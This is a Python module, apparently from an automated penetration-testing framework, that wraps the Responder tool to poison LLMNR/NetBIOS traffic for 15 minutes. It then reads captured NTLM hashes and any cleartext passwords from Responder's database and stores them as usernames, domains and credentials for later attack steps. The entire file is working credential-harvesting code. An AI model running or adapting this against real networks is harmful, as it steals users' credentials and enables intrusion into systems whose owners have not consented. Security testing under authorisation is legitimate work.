import datetime
from core.actionModule import actionModule
from core.utils import Utils
from core.keystore import KeyStore as kb


class responder(actionModule):
    def __init__(self, config, display, lock):
        super(responder, self).__init__(config, display, lock)
        self.title = "Run Responder and watch for hashes"
        self.shortName = "Responder"
        self.description = "execute [reponder -I eth0 -wrf]"

        self.requirements = ["responder"]
        self.triggers = ["always"]

        self.safeLevel = 3

        self.maxThreads = 1

    def process(self):
        default_interface = self.config["responder_iface"]
        default_delay = self.config["responder_delay"]
        responder_path = self.config["responder_path"]
        my_ip = self.config["lhost"]

        # TODO
        # check to see if we got any creds 
        # if not, wait 5 minutes and run again for 15 minutes
        # Extract usernames from results and add to KB
        found_hash = False
        times_run = 0
        #while not found_hash and times_run < 4:
        self.display.output("Starting responder...")
        temp_file1 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)
        temp_file2 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)
        command = "python " + responder_path + "Responder.py -I " + default_interface + " -i " + my_ip + " -wrf"
        # run for 15 minutes
        start_time = '{:%d-%m-%Y %H:%M:%S}'.format(datetime.datetime.now())
        result = Utils.execWait(command, temp_file1, timeout=900)
        responder_db = responder_path + "Responder.db"
        #STDOUT unreliable, grabbed hashes directly from the DB instead
        command = "sqlite3 " + responder_db + " \"select * from responder where timestamp > '" + start_time + "'\""
        result = Utils.execWait(command, temp_file2, timeout=10)
        times_run += 1
        #Have to account for responder not creating a new db file if nothing was found
        if not "no such table" in result:
            for part in result.splitlines():
                found_hash = True #Found a hash, set to true to prevent loop
                record = part.split('|')
                if len(record) > 0:
                    method = record[1]
                    hashtype = record[2]
                    host = record[3]
                    username = record[5]
                    domain = username.split('\\')[0]
                    user = username.split('\\')[1]
                    cleartext = record[6]
                    shorthash = record[7]
                    fullhash = record[8]
                    self.display.error("Vuln [NetBIOS|LLMNR] Found new hash - ", fullhash)
                    self.addVuln(host, "NetBIOS|LLMNR", {"port": "445", "output": temp_file2.replace("/", "%2F")})
                    kb.add("domain/" + domain + "/" + user + "/" + hashtype + "/" + fullhash)
                    if len(cleartext) > 0:
                        kb.add("creds/host/" + host + "/port/445/service/smb/username/" + user + "/password/" + cleartext)

            #if not found_hash:
            #    time.sleep(300) # sleep for 5 minutes

        # repeat upto 5 4 times
        if found_hash:
            self.fire("newNTLMHash")
        return
